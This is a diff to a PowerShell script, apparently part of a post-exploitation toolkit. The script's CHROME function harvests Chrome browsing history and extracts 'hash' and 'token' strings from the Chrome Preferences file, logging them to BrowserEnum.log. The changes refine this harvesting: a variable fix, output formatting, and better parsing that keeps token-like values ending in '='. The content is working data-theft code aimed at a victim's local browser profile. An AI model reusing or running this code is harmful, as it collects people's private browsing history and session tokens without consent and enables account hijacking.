@@ -576,7 +576,7 @@ function CHROME {
             echo "{Could not find any History}" >> $LogFilePath\BrowserEnum.log
         }else{
             $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
-            $Get_Values = Get-Content -Path "$History_Path"|Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
+            $Get_Values = Get-Content -Path "$History_Path"|Select-String -AllMatches $Regex |% {($_.Matches).Value} |Sort -Unique
             $Get_Values | ForEach-Object {
                 $Key = $_
                 if ($Key -match $Search){
@@ -603,16 +603,16 @@ function CHROME {
         }
 
         ## Retrieve Chrome Cookies (hashs)
-        echo "`nChrome Hashs|Tokens" >> $LogFilePath\BrowserEnum.log
+        echo "`n`nChrome Hashs|Tokens" >> $LogFilePath\BrowserEnum.log
         echo "-------------------" >> $LogFilePath\BrowserEnum.log
         $Cookie_Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
         If(-not(Test-Path -Path $Cookie_Path)){
             echo "{Could not find any Hashs|Tokens}" >> $LogFilePath\BrowserEnum.log
         }else{
             $Preferencies_Path = get-content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
-            $Parse_String = $Preferencies_Path.split(",");$Find_MyHash = $Parse_String|Select-String "hash","token"
-            $BadChars = $Find_MyHash -replace '"setting":{"hasHighScore":false',''
-            $Dump_Key_Hash = $BadChars|where-object {$_}
+            $Parse_String = $Preferencies_Path.split(",");$Find_MyHashes = $Parse_String|Select-String "hash","token"
+            $BadChars = $Find_MyHashes -replace '"','' -replace '{','' -replace '\[','' -replace '}','' -replace '\]',''
+            $Dump_Key_Hash = $BadChars|Select-String -pattern '[=]$' # Regex to match the last char '=' of the string.
             echo $Dump_Key_Hash >> $LogFilePath\BrowserEnum.log
         }
 }
